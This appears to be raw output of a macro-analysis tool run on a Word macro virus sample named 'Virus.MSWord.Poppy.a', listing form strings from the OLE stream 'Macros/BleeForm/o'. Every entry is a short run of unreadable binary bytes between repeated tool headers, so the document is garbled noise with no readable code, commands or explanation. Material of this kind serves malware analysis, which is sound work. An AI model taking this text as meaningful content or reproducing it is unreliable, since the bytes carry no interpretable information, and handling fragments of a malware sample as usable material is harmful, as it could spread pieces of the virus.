- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
wui�v��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n�S�G��]~��O��^�����OE
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9'��<�8�=iO�.�Q�`��*�C�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����~�c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b{�]C��S�:�'M�	%�a�i���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S�a�\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
։v?�ɤ⣬��m+�1�`<�}T�a�1��߬w
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p��;!�˨׆�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������Zk�ka��:�.v�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��s�zخ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1��W~��2�QZi�jC
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��n�^�M��P
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�c<�=��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@��K;\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZS�+ ;���6�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q�?�P	$��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
΢&��Λ7��x?�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�8�]wq�Dc��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
bG�>�X��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>)n�z�>&8c��?S��i3���lc�e��m�U�a�RF
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�?���7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BX8��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
xZ��j���5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�<�q��3�K�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y�㤷�#2���
3��x�]{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���O�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|�N�_h-��F���Q�@p}>�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8���Q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��۶�|�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Smc
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���#�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]�����-�j���c�t�[r;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y��O�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>�_�<B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�RT|���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�5���En���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ٟl�9��)di�J�'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
௒��5��7���b�*ۃd
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��|��	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�i��_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��|�/�9�tsQwZ�Am52N���6H>�����4<h�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c��tYf
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^�晵AM�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GO��-ER-�zzF̏4�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N�����}��:s�u1TQ�-���*Z#$�u�)�\�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4�n$������-m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Yޟ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ڟ�-`��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ޓK�c#�IQ)di±�H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H6z���et�wY���ƪ�u��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�"S�0,�X��>
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$�O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���n|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_y�b8�I�|O��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\_2G�'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Wڊ�;E���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
SHd�˟�(�
��9%�m�YA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�t7{�T�v�b�ZH�ei�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3)E9"5$|�(�۽C
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H��\���&��Q�E�GMl���K4
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��)Tۍ��.I;�73�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v���nU�Z�Jt�a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3���tM�w��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Q�r�t�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�
{�ڟ�n�;l���%���~hg�e@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��?��*���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l_�4��C[=[$�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`�4-�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y\��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��\/�(+��2�5A4��<�UuC��aCn|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y�p�$�M
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%M�.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B�%�n�p(]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��0$˝��f
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cٿw�+E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�7��9�Vy����*!Z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�v(,���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

˜a�Oj
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ٯ�EyIfX��r��g
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I�z��=��X��#�Zjy&��W����	�(GHܯ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3����6����Z+���һEMcZ�)#BĨ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������I�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�>)�M
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,���ZBC
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���tNI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ѿ��b��v
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ǩ>�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�F݂N:۷P�W�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 ~���Js��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���.�68�=
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�zs�R�<I�֘���eH���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	#>��#�����b��UL��orp� g��^:��*魗)�I�@���RO�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1���CG��G��m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z����"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#'�q�q鏦:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�z��ڪ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�*G�E+�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$�G��6�tj�/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$b6y&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��0��p0	��g=q�멾(5]IiZO�99Ϧ���ϧ�u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�\VB3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}��f��9��j����4`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�W��r3����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�_�sh�jYj#�#�(�g\�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}3�N:���k?n5��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��y{�n� �#!�O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����Ul/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��^T���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

6���Fy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4�G�G��o�Xp��b䆝�_�[]�˹u�̴"��S��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��pO�8��?^�>���]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��UK^�.�Rb��D`��3B�� ������u���ե�QцG;wg�d~�f���\Z��h��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ѡ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-����1���ח
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�J��N��]���1�8�2��Ӯ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J�)�=]���ERZ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R��Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$�g�t�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S���}�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Q��ρX���O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}:S��S�d�

-------------------------------------------------------------------------------
